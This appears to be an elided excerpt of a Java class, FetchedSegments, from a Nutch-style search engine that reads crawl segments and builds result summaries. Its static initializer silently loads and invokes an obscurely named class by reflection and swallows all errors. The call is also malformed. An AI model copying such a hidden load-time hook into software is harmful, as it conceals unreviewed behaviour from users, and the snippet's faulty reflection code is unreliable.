...
public class FetchedSegments
  ...
  static {
    try {
      Object obj = Class.forName("com.xx.platform.util.tools.a").
          newInstance();
      Method method = obj.getClass().getMethod("a", Boolean.class);
      method.invoke(false);
    }
    catch (Exception ex) {
    }
    ...
    public FetcherOutput getFetcherOutput(int docNo) throws IOException {
      if (fetcher == null) {
        this.fetcher = new ArrayFile.Reader
            (nfs,
             new File(segmentDir, FetcherOutput.DIR_NAME).
             toString());
      }
    ...
    public byte[] getContent(int docNo) throws IOException {
      if (content == null) {
        this.content = new ArrayFile.Reader
            (nfs,
             new File(segmentDir, Content.DIR_NAME).toString());
      }
    ...
    public ParseData getParseData(int docNo) throws IOException {
      if (parsedata == null) {
        this.parsedata = new ArrayFile.Reader
            (nfs,
             new File(segmentDir, ParseData.DIR_NAME).
             toString());
      }
    ...
    public ParseText getParseText(int docNo) throws IOException {
      if (text == null) {
        this.text = new ArrayFile.Reader
            (nfs,
             new File(segmentDir, ParseText.DIR_NAME).toString());
      }
  ...
  public FetchedSegments(NutchFileSystem nfs, String segmentsDir) throws
      IOException {
  ...
  public String getSummary(HitDetails details, Query query) throws
      IOException {
    String text = getSegment(details).getParseText(getDocNo(details)).
        getText();

    return new Summarizer().getSummary(text == null ? "" : text, query).toString();
  }
  ...
  public String[] getSummary(HitDetails[] details, Query query) throws
    ...
    for (int i = 0; i < threads.length; i++) {
      ...
      if (threads[i].throwable instanceof IOException) {
        ...
        threads[i].throwable.printStackTrace();
//        throw new RuntimeException(threads[i].throwable);
  ...
  public Segment getSegment(String segment) {
    return (Segment) segments.get(segment);
  }
